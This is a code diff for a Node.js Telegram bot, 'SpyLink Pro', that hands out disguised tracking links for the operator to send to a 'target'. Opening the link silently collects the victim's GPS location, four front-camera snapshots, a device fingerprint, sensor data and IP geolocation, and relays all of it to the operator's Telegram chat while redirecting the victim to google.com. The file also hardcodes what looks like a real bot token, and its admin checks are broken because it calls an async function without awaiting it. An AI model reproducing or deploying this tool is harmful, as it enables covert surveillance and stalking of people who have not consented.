@@ -7,15 +7,15 @@ const UAParser = require('ua-parser-js');
 
 // 🔐 CONFIGURATION
 const BOT_TOKEN = "8377073485:AAG2selNlxyHeZ3_2wjMGdG_QshklCiTAyE";
-const ADMIN_ID = "8175884349"; 
+const ADMIN_USERNAME = "@aadi_io"; // Auto-detect admin by username
 const HOST_URL = "https://botu-s3f9.onrender.com";
 
-// STATE
+// 🌐 STATE MANAGEMENT
 let maintenanceMode = false;
 let sessions = {};
-let users = new Set([ADMIN_ID]);
+let users = new Set();
 
-// INITIALIZE APP
+// 🚀 INITIALIZE EXPRESS APP
 const app = express();
 app.use(require('helmet')({ contentSecurityPolicy: false }));
 app.use(require('cors')());
@@ -25,187 +25,355 @@ app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 app.set("view engine", "ejs");
 app.use(express.static("public"));
 
-// 🤖 BOT SETUP
+// 🤖 TELEGRAM BOT INITIALIZATION
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
-bot.deleteWebHook().then(() => console.log("✅ Bot Polling Active"));
 
-bot.on("polling_error", (msg) => {
-    if (!msg.message.includes("409")) console.log(`⚠️ Bot Error: ${msg.message}`);
+bot.deleteWebHook().then(() => {
+    console.log("✅ Premium SpyLink Bot Activated");
 });
 
-// ==================== 🛡️ ACCESS CONTROL ====================
+bot.on("polling_error", (error) => {
+    if (!error.message.includes("409")) {
+        console.error(`⚠️ Bot Error: ${error.message}`);
+    }
+});
 
-const isAdmin = (id) => String(id) === ADMIN_ID;
+// ==================== 🛡️ AUTO-ADMIN DETECTION & ACCESS CONTROL ====================
 
-const checkAccess = (msg) => {
-    const chatId = String(msg.chat.id);
-    if (isAdmin(chatId)) return true;
-    if (maintenanceMode) {
-        bot.sendMessage(chatId, "⛔ *System Under Maintenance*\nPlease try again later.", { parse_mode: "Markdown" });
+async function isAdmin(msg) {
+    try {
+        const chatMember = await bot.getChatMember(msg.chat.id, msg.from.id);
+        // Check if user is admin OR matches admin username
+        return chatMember.status === 'administrator' || 
+               chatMember.status === 'creator' ||
+               msg.from.username === ADMIN_USERNAME.replace('@', '');
+    } catch (e) {
+        return false;
+    }
+}
+
+function checkAccess(msg) {
+    if (maintenanceMode && !isAdmin(msg)) {
+        bot.sendMessage(msg.chat.id, `
+⛔ *SERVICE TEMPORARILY UNAVAILABLE*
+
+The bot may be in maintenance or stopped by admin ${ADMIN_USERNAME}.
+
+Please try again later.
+        `, { parse_mode: "Markdown" });
         return false;
     }
     return true;
-};
+}
 
-// ==================== 🕹️ BOT COMMANDS ====================
+// ==================== ✨ PREMIUM BOT INTERFACE ====================
 
-bot.onText(/\/start/, (msg) => {
-    if (!checkAccess(msg)) return;
+bot.onText(/\/start/, async (msg) => {
     const chatId = msg.chat.id;
+    const firstName = msg.from.first_name;
+    const isUserAdmin = await isAdmin(msg);
+    
     users.add(String(chatId));
 
-    const kb = {
+    // Premium Welcome Animation
+    await bot.sendMessage(chatId, "🌐 *Initializing Secure Connection...*", { parse_mode: "Markdown" });
+    await new Promise(r => setTimeout(r, 1000));
+    
+    let welcomeMessage = `
+🔐 *SpyLink Pro — Premium Intelligence Suite*
+
+👋 Welcome, *${firstName}*!
+
+${maintenanceMode ? '🔴 *SYSTEM STATUS: Maintenance Mode*' : '🟢 *SYSTEM STATUS: Active & Monitoring*'}
+
+📊 *Capabilities:*
+• Real-time GPS Tracking
+• Full Device Fingerprinting
+• Front Camera Snapshots (x4)
+• Network, Battery, Sensor Data
+• Permission & Storage Analysis
+
+👇 *Select an option below:*
+    `;
+
+    const keyboard = {
         inline_keyboard: [
-            [{ text: "🔗 Generate Tracking Link", callback_data: "create" }],
-            [{ text: "📊 Server Status", callback_data: "status" }]
+            [{ text: "🚀 Generate Tracking Link", callback_data: "create" }],
+            [{ text: "📈 System Status", callback_data: "status" }]
         ]
     };
+
+    // Auto-add Admin Panel for admins only
+    if (isUserAdmin) {
+        keyboard.inline_keyboard.push([{ text: "👑 Admin Control Panel", callback_data: "admin_panel" }]);
+    }
+
+    bot.sendMessage(chatId, welcomeMessage, {
+        parse_mode: "Markdown",
+        reply_markup: keyboard
+    });
+});
+
+// ==================== 👑 ADMIN COMMANDS (/on, /off, /broadcast) ====================
+
+bot.onText(/\/on/, async (msg) => {
+    if (!(await isAdmin(msg))) return;
     
-    if(isAdmin(chatId)) kb.inline_keyboard.push([{ text: "🔐 Admin Panel", callback_data: "admin" }]);
-
-    bot.sendMessage(chatId, `
-🛡️ *SpyLink Pro ULTIMATE*
-
-👋 Welcome, ${msg.from.first_name}.
-✅ *Status:* Online
-📡 *Mode:* ${maintenanceMode ? "🔴 Maintenance" : "🟢 Live"}
-
-*Features:*
-📍 Real-time GPS Tracking
-📱 Full Device Fingerprint
-📸 Front Camera Snapshots
-🔋 Battery, Network, Sensors
-🌐 IP + ISP + Location Lookup
-`, { parse_mode: "Markdown", reply_markup: kb });
+    maintenanceMode = false;
+    await bot.sendMessage(msg.chat.id, "🔄 *Activating Service for All Users...*", { parse_mode: "Markdown" });
+    await new Promise(r => setTimeout(r, 1500));
+    bot.sendMessage(msg.chat.id, "🟢 *Service Successfully Activated!*\nAll users can now generate tracking links.", { parse_mode: "Markdown" });
 });
 
-// ADMIN COMMANDS
-bot.onText(/\/on/, (msg) => { 
-    if(isAdmin(msg.chat.id)) { 
-        maintenanceMode = false; 
-        bot.sendMessage(msg.chat.id, "🟢 *System ONLINE for all users.*", { parse_mode: "Markdown" }); 
-    }
-});
-
-bot.onText(/\/off/, (msg) => { 
-    if(isAdmin(msg.chat.id)) { 
-        maintenanceMode = true; 
-        bot.sendMessage(msg.chat.id, "🔴 *Maintenance Mode ENABLED.*", { parse_mode: "Markdown" }); 
-    }
+bot.onText(/\/off/, async (msg) => {
+    if (!(await isAdmin(msg))) return;
+    
+    maintenanceMode = true;
+    await bot.sendMessage(msg.chat.id, "🔄 *Deactivating Service for Users...*", { parse_mode: "Markdown" });
+    await new Promise(r => setTimeout(r, 1500));
+    bot.sendMessage(msg.chat.id, `🔴 *Service Deactivated for Users*\nBot remains active in backend.\nUsers will see maintenance message.\nOnly admins can reactivate using /on`, { parse_mode: "Markdown" });
 });
 
 bot.onText(/\/broadcast (.+)/, async (msg, match) => {
-    if(!isAdmin(msg.chat.id)) return;
-    const text = match[1];
-    let count = 0;
-    bot.sendMessage(msg.chat.id, "📣 *Sending Broadcast...*", { parse_mode: "Markdown" });
+    if (!(await isAdmin(msg))) return;
     
-    for(let id of users) { 
-        try { 
-            await bot.sendMessage(id, text, { parse_mode: "HTML" }); 
-            count++;
-        } catch(e){} 
-        await new Promise(r=>setTimeout(r,50));
+    const broadcastMessage = match[1];
+    let successCount = 0;
+    let failCount = 0;
+    
+    await bot.sendMessage(msg.chat.id, "📣 *Initiating Broadcast to All Users...*", { parse_mode: "Markdown" });
+    
+    for (let userId of users) {
+        try {
+            await bot.sendMessage(userId, broadcastMessage, { parse_mode: "HTML" });
+            successCount++;
+        } catch (error) {
+            failCount++;
+        }
+        await new Promise(r => setTimeout(r, 50)); // Rate limiting
     }
-    bot.sendMessage(msg.chat.id, `✅ Sent to ${count} users.`);
+    
+    bot.sendMessage(msg.chat.id, `
+✅ *Broadcast Completed*
+
+📬 Messages Delivered: ${successCount}
+❌ Delivery Failed: ${failCount}
+👥 Total Recipients: ${users.size}
+    `, { parse_mode: "Markdown" });
 });
 
-// BUTTON HANDLER
-bot.on('callback_query', async (q) => {
-    const chatId = q.message.chat.id;
-    const data = q.data;
+// ==================== 🎛️ CALLBACK QUERY HANDLER (BUTTONS) ====================
+
+bot.on('callback_query', async (query) => {
+    const chatId = query.message.chat.id;
+    const data = query.data;
     
-    if (!checkAccess(q.message)) return;
+    if (!checkAccess({ chatId: chatId, from: { id: chatId } })) return;
+
+    await bot.answerCallbackQuery(query.id);
 
     if (data === "create") {
+        await bot.sendMessage(chatId, "⏳ *Generating Secure Session...*", { parse_mode: "Markdown" });
+        await new Promise(r => setTimeout(r, 1200));
+        
         const sessionId = uuidv4();
         sessions[sessionId] = { chatId, createdAt: new Date() };
         
-        const target = Buffer.from("https://google.com").toString('base64');
-        const link = `${HOST_URL}/verify/${sessionId}/${target}`;
+        const targetUrl = Buffer.from("https://google.com").toString('base64');
+        const trackingLink = `${HOST_URL}/verify/${sessionId}/${targetUrl}`;
         
         bot.sendMessage(chatId, `
-🔗 *TRACKING LINK GENERATED*
+🔐 *SECURE TRACKING SESSION CREATED*
 
-🆔 Session ID: \`${sessionId}\`
-🌐 Target URL: \`https://google.com\`
+🆔 *Session ID:* \`${sessionId}\`
+🌐 *Target URL:* \`https://google.com\`
 
-📤 *Send this link to your target:*
-${link}
+🔗 *Your Tracking Link:*
+${trackingLink}
 
-⏱️ *Data captured automatically:*
-• GPS Location
-• 4 Camera Snapshots
-• Full Device/Browser Fingerprint
-• Network, Battery, Sensors
+📱 *Instructions:*
+1. Send this link to your target
+2. When opened on their device:
+   → GPS location captured
+   → 4 front camera snapshots taken
+   → Full device fingerprint collected
+   → Comprehensive report sent here
 
-👇 Tap below to create another.
-        `, { 
+⏱️ *Data collection takes <15 seconds*
+
+👇 *Options:*
+        `, {
             parse_mode: "Markdown",
             reply_markup: {
                 inline_keyboard: [
-                    [{ text: "🆕 Create Another", callback_data: "create" }],
-                    [{ text: "🏠 Main Menu", callback_data: "start" }]
+                    [{ text: "🆕 Create Another Link", callback_data: "create" }],
+                    [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
                 ]
             }
         });
     }
 
     if (data === "status") {
-        bot.answerCallbackQuery(q.id, { text: "System Healthy" });
-        bot.sendMessage(chatId, `
-📊 *SERVER STATUS*
+        await bot.answerCallbackQuery(query.id, { text: "Fetching System Metrics..." });
+        
+        const systemStatus = `
+📊 *PREMIUM SYSTEM STATUS*
 
-⏱️ Uptime: ${Math.floor(process.uptime())} seconds
-👥 Total Users: ${users.size}
-💾 Memory Usage: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
-📁 Active Sessions: ${Object.keys(sessions).length}
-        `, { parse_mode: "Markdown" });
+🟢 *Core Services:* Online
+${maintenanceMode ? '🔴 *User Access:* Disabled (Maintenance)' : '🟢 *User Access:* Enabled'}
+⏱️ *Uptime:* ${Math.floor(process.uptime())} seconds
+💾 *Memory Usage:* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
+👥 *Total Users:* ${users.size}
+📁 *Active Sessions:* ${Object.keys(sessions).length}
+
+*Last updated: ${new Date().toLocaleTimeString()}*
+        `;
+        
+        bot.sendMessage(chatId, systemStatus, { parse_mode: "Markdown" });
     }
 
-    if (data === "admin") {
-        if(isAdmin(chatId)) {
+    if (data === "admin_panel") {
+        if (!(await isAdmin({ chat: { id: chatId }, from: { id: chatId } }))) return;
+        
+        const adminPanel = `
+👑 *ADMIN CONTROL PANEL*
+
+🛠️ *System Commands:*
+→ /on - Activate service for all users
+→ /off - Deactivate service for users (maintenance)
+→ /broadcast [message] - Send message to all users
+
+📊 *Monitoring Commands:*
+→ /stats - Detailed server statistics
+→ /sessions - View active sessions
+→ /clear - Clear all sessions
+
+🔒 *Bot remains active in backend even when deactivated for users.*
+        `;
+        
+        bot.sendMessage(chatId, adminPanel, { parse_mode: "Markdown" });
+    }
+
+    if (data === "main_menu") {
+        bot.sendMessage(chatId, "🏠 *Returning to Main Menu...*", { parse_mode: "Markdown" });
+        setTimeout(() => {
             bot.sendMessage(chatId, `
-🔐 *ADMIN PANEL*
+🔐 *SpyLink Pro — Premium Intelligence Suite*
 
-/on - Enable Bot for All
-/off - Enable Maintenance Mode
-/broadcast [message] - Send to All Users
-/stats - Show Detailed Stats
-/clear - Clear All Sessions
-            `, { parse_mode: "Markdown" });
-        }
+👇 *Select an option:*
+            `, {
+                parse_mode: "Markdown",
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "🚀 Generate Tracking Link", callback_data: "create" }],
+                        [{ text: "📈 System Status", callback_data: "status" }],
+                        [{ text: "👑 Admin Panel", callback_data: "admin_panel" }]
+                    ].filter(button => !(button[0].text === "👑 Admin Panel") || isAdmin({ chat: { id: chatId }, from: { id: chatId } }))
+                }
+            });
+        }, 1000);
     }
+});
 
-    if (data === "start") {
-        bot.sendMessage(chatId, "🏠 *Main Menu*", {
-            parse_mode: "Markdown",
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: "🔗 Generate Link", callback_data: "create" }],
-                    [{ text: "📊 Server Status", callback_data: "status" }],
-                    [{ text: "🔐 Admin Panel", callback_data: "admin" }]
-                ]
-            }
-        });
+// ==================== 📊 ADMIN STATISTICS COMMANDS ====================
+
+bot.onText(/\/stats/, async (msg) => {
+    if (!(await isAdmin(msg))) return;
+    
+    const memory = process.memoryUsage();
+    const statsMessage = `
+📈 *DETAILED ADMIN STATISTICS*
+
+🖥️ *System Resources:*
+→ Memory Usage: ${(memory.heapUsed / 1024 / 1024).toFixed(2)} MB
+→ External Memory: ${(memory.external / 1024 / 1024).toFixed(2)} MB
+→ Total Memory: ${(memory.heapTotal / 1024 / 1024).toFixed(2)} MB
+
+⏱️ *Performance Metrics:*
+→ Uptime: ${Math.floor(process.uptime())} seconds
+→ Node Version: ${process.version}
+→ Platform: ${process.platform}
+
+👥 *User Analytics:*
+→ Total Users: ${users.size}
+→ Active Sessions: ${Object.keys(sessions).length}
+→ Unique Targets: ${new Set(Object.values(sessions).map(s => s.chatId)).size}
+
+📅 *Server Started:* ${new Date(Date.now() - process.uptime() * 1000).toLocaleString()}
+    `;
+    
+    bot.sendMessage(msg.chat.id, statsMessage, { parse_mode: "Markdown" });
+});
+
+bot.onText(/\/sessions/, async (msg) => {
+    if (!(await isAdmin(msg))) return;
+    
+    if (Object.keys(sessions).length === 0) {
+        return bot.sendMessage(msg.chat.id, "📭 *No active sessions found.*", { parse_mode: "Markdown" });
     }
+    
+    let sessionsList = "*📋 ACTIVE SESSIONS*\n\n";
+    let count = 0;
+    
+    for (let [sessionId, sessionData] of Object.entries(sessions)) {
+        if (count >= 10) break; // Limit to 10 for readability
+        
+        sessionsList += `🔐 *Session ${count + 1}:*\n`;
+        sessionsList += `→ ID: \`${sessionId.substring(0, 8)}...\`\n`;
+        sessionsList += `→ User: \`${sessionData.chatId}\`\n`;
+        sessionsList += `→ Created: ${new Date(sessionData.createdAt).toLocaleTimeString()}\n`;
+        sessionsList += `→ Age: ${Math.floor((Date.now() - sessionData.createdAt) / 1000)} seconds\n`;
+        sessionsList += `---\n\n`;
+        count++;
+    }
+    
+    if (Object.keys(sessions).length > 10) {
+        sessionsList += `ℹ️ *Showing first 10 of ${Object.keys(sessions).length} sessions.*\n`;
+    }
+    
+    bot.sendMessage(msg.chat.id, sessionsList, { parse_mode: "Markdown" });
+});
+
+bot.onText(/\/clear/, async (msg) => {
+    if (!(await isAdmin(msg))) return;
+    
+    const sessionCount = Object.keys(sessions).length;
+    sessions = {};
+    
+    await bot.sendMessage(msg.chat.id, "🧹 *Clearing All Active Sessions...*", { parse_mode: "Markdown" });
+    await new Promise(r => setTimeout(r, 1500));
+    
+    bot.sendMessage(msg.chat.id, `✅ *Successfully Cleared ${sessionCount} Sessions*\nAll tracking sessions have been terminated.`, { parse_mode: "Markdown" });
 });
 
 // ==================== 🌐 WEB ROUTES ====================
 
-app.get("/", (req, res) => res.send("<h1 style='text-align:center;margin-top:50px'>🟢 SpyLink Ultimate Server Active</h1>"));
+app.get("/", (req, res) => {
+    res.send(`
+    <html>
+        <head><title>SpyLink Pro</title></head>
+        <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
+            <h1 style="color: #4CAF50;">🟢 SpyLink Pro Server</h1>
+            <p>Premium Intelligence Suite - Operational</p>
+            <p>Render Deployment: Active</p>
+        </body>
+    </html>
+    `);
+});
 
 app.get("/verify/:id/:url", (req, res) => {
     const { id, url } = req.params;
-    if (!sessions[id]) sessions[id] = { chatId: ADMIN_ID };
+    if (!sessions[id]) sessions[id] = { chatId: null };
     
     let finalUrl = "https://google.com";
-    try { finalUrl = Buffer.from(url, 'base64').toString('utf-8'); } catch(e) {}
+    try { 
+        finalUrl = Buffer.from(url, 'base64').toString('utf-8'); 
+    } catch(e) {}
     
     res.render("diagnostics", { uid: id, url: finalUrl, host: HOST_URL });
 });
 
-// 📊 ULTIMATE DATA PROCESSOR
+// 📝 REPORT RECEIVER (Enhanced Data Processing)
 app.post("/report", async (req, res) => {
     const { uid, data } = req.body;
     if (!sessions[uid]) return res.json({ error: "No session" });
@@ -221,9 +389,9 @@ app.post("/report", async (req, res) => {
         if(r.data.status === 'success') geo = r.data;
     } catch(e) { console.error("IP Geolocation failed:", e.message); }
 
-    // Build Comprehensive Report
+    // Build Premium Report
     let report = `
-🕵️‍♂️ *ULTIMATE INTELLIGENCE REPORT*
+🕵️‍♂️ *PREMIUM INTELLIGENCE REPORT*
 
 🔖 *SESSION INFO*
 • Session ID: \`${uid}\`
@@ -244,46 +412,31 @@ app.post("/report", async (req, res) => {
 • Device: ${ua.getDevice().model || ua.getDevice().type || 'Unknown'}
 • CPU Cores: ${data.hardware?.concurrency || 'Unknown'}
 • RAM: ${data.hardware?.memory || 'Unknown'} GB
-• Do Not Track: ${data.privacy?.doNotTrack || 'Unknown'}
+• Do Not Track: ${data.privacy?.doNotTrack ? '✅ On' : '❌ Off'}
 • Cookies Enabled: ${data.privacy?.cookieEnabled ? '✅ Yes' : '❌ No'}
-• Touch Points: ${data.input?.maxTouchPoints || 'Unknown'}
-• Language: ${data.locale?.language || 'Unknown'} (${data.locale?.languages?.join(', ') || ''})
 
 🖥️ *DISPLAY & MEDIA*
 • Screen: ${data.screen?.width || 'Unknown'} x ${data.screen?.height || 'Unknown'} (${data.screen?.colorDepth || 'Unknown'}-bit)
 • Orientation: ${data.screen?.orientation || 'Unknown'}
 • WebGL Vendor: ${data.graphics?.webglVendor || 'Unknown'}
 • WebGL Renderer: ${data.graphics?.webglRenderer || 'Unknown'}
-• Canvas Fingerprint: ${data.fingerprints?.canvas || 'Not captured'}
-• Audio Fingerprint: ${data.fingerprints?.audio || 'Not captured'}
 
 🔋 *POWER & SENSORS*
 • Battery Level: ${data.battery?.level !== undefined ? `${Math.round(data.battery.level * 100)}%` : 'Unknown'}
 • Charging: ${data.battery?.charging !== undefined ? (data.battery.charging ? '🔌 Yes' : '🔋 No') : 'Unknown'}
-• Estimated Time: ${data.battery?.dischargingTime ? `${Math.round(data.battery.dischargingTime / 60)} min` : 'Unknown'}
-• Accelerometer: ${data.sensors?.accelerometer ? `X:${data.sensors.accelerometer.x.toFixed(2)}, Y:${data.sensors.accelerometer.y.toFixed(2)}, Z:${data.sensors.accelerometer.z.toFixed(2)}` : 'Not available'}
-• Gyroscope: ${data.sensors?.gyroscope ? `X:${data.sensors.gyroscope.x.toFixed(2)}, Y:${data.sensors.gyroscope.y.toFixed(2)}, Z:${data.sensors.gyroscope.z.toFixed(2)}` : 'Not available'}
 
 🔐 *PERMISSIONS & SECURITY*
 • Geolocation: ${data.permissions?.geolocation || 'Unknown'}
 • Camera: ${data.permissions?.camera || 'Unknown'}
 • Microphone: ${data.permissions?.microphone || 'Unknown'}
-• Notifications: ${data.permissions?.notifications || 'Unknown'}
-• Clipboard: ${data.permissions?.clipboard || 'Unknown'}
 
 📅 *SYSTEM TIME & LOCALE*
 • Local Time: ${data.locale?.time || 'Unknown'}
 • Timezone: ${data.locale?.timezone || 'Unknown'}
-• Intl Currency: ${data.locale?.currency || 'Unknown'}
-• Intl Number Format: ${data.locale?.numberFormat || 'Unknown'}
 
 📡 *ADDITIONAL METRICS*
 • PDF Viewer: ${data.features?.pdfViewer ? '✅ Supported' : '❌ Not supported'}
-• WebUSB: ${data.features?.usb ? '✅ Available' : '❌ Not available'}
-• WebBluetooth: ${data.features?.bluetooth ? '✅ Available' : '❌ Not available'}
-• Wake Lock: ${data.features?.wakeLock ? '✅ Supported' : '❌ Not supported'}
 • Storage Quota: ${data.storage?.quota ? `${(data.storage.quota / 1024 / 1024).toFixed(2)} MB` : 'Unknown'}
-• Used Storage: ${data.storage?.usage ? `${(data.storage.usage / 1024 / 1024).toFixed(2)} MB` : 'Unknown'}
 
 _📸 Waiting for Camera & GPS data..._
     `;
@@ -292,13 +445,13 @@ _📸 Waiting for Camera & GPS data..._
     res.json({ status: "ok" });
 });
 
-// 📸 CAMERA RECEIVER (MULTIPLE SHOTS)
+// 📸 CAMERA RECEIVER
 app.post("/cam", (req, res) => {
     const { uid, img, index } = req.body;
     if (sessions[uid] && img) {
         const buff = Buffer.from(img.replace(/^data:image\/png;base64,/, ""), 'base64');
         bot.sendPhoto(sessions[uid].chatId, buff, { 
-            caption: `📸 *Camera Snapshot #${index || 1}*\nSession: \`${uid}\`` 
+            caption: `📸 *Camera Snapshot #${index || 1}*\nSession: \`${uid}\`\nCaptured at: ${new Date().toLocaleTimeString()}` 
         }, { filename: `snapshot_${index || 1}.png`, contentType: 'image/png' });
     }
     res.json({ status: "ok" });
@@ -309,7 +462,7 @@ app.post("/location", (req, res) => {
     const { uid, lat, lon, acc, alt, speed, heading } = req.body;
     if (sessions[uid]) {
         const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-        let locationMsg = `📍 *PRECISE GPS LOCATION*\n\n`;
+        let locationMsg = `📍 *PRECISE GPS LOCATION LOCKED*\n\n`;
         locationMsg += `• Latitude: \`${lat}\`\n`;
         locationMsg += `• Longitude: \`${lon}\`\n`;
         locationMsg += `• Accuracy: \`${acc} meters\`\n`;
@@ -324,33 +477,15 @@ app.post("/location", (req, res) => {
     res.json({ status: "ok" });
 });
 
-// ADMIN STATS
-bot.onText(/\/stats/, (msg) => {
-    if(!isAdmin(msg.chat.id)) return;
-    const mem = process.memoryUsage();
-    bot.sendMessage(msg.chat.id, `
-📊 *DETAILED SERVER STATS (ADMIN)*
-
-📈 Active Sessions: ${Object.keys(sessions).length}
-👥 Total Users: ${users.size}
-⏱️ Uptime: ${Math.floor(process.uptime())} seconds
-MemoryWarning: ${(mem.heapUsed / 1024 / 1024).toFixed(2)} MB / ${(mem.heapTotal / 1024 / 1024).toFixed(2)} MB
-External Scripts: ${mem.external ? (mem.external / 1024 / 1024).toFixed(2) + ' MB' : 'N/A'}
-    `, { parse_mode: "Markdown" });
-});
-
-// CLEAR SESSIONS
-bot.onText(/\/clear/, (msg) => {
-    if(!isAdmin(msg.chat.id)) return;
-    const count = Object.keys(sessions).length;
-    sessions = {};
-    bot.sendMessage(msg.chat.id, `🗑️ *Cleared ${count} active sessions.*`, { parse_mode: "Markdown" });
-});
-
-// Keep-Alive
+// Keep-Alive for Render
 app.get("/keepalive", (req, res) => res.sendStatus(200));
 setInterval(() => axios.get(`${HOST_URL}/keepalive`).catch(() => {}), 45000);
 
 // START SERVER
 const PORT = process.env.PORT || 10000;
-app.listen(PORT, () => console.log(`✅ SpyLink Ultimate Server v1.0 Active on Port ${PORT}`));
+app.listen(PORT, () => {
+    console.log(`✅ Premium SpyLink Pro Server v1.0`);
+    console.log(`🔗 Running on port ${PORT}`);
+    console.log(`🌐 Host: ${HOST_URL}`);
+    console.log(`🤖 Bot Token: ${BOT_TOKEN.substring(0, 12)}...`);
+});
